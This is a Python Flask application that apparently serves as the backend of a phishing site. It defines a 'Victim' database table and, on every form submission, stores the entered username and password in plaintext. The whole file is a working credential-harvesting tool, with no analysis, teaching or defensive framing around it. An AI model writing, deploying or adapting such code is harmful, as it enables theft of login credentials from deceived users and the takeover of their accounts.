from flask import Flask, request
from flask.templating import render_template
from flask_sqlalchemy import SQLAlchemy
import os

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = os.environ['DATABASE_URL']
db = SQLAlchemy(app)


class Victim(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(180), nullable=False)
    password = db.Column(db.String(120), nullable=False)


@app.route('/', methods=['GET', 'POST'])
def home():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')

        new_victim = Victim(
            username = username,
            password = password,
        )
        db.session.add(new_victim)
        db.session.commit()
    
    return render_template('index.html')

if __name__ =="__main__":
    app.run()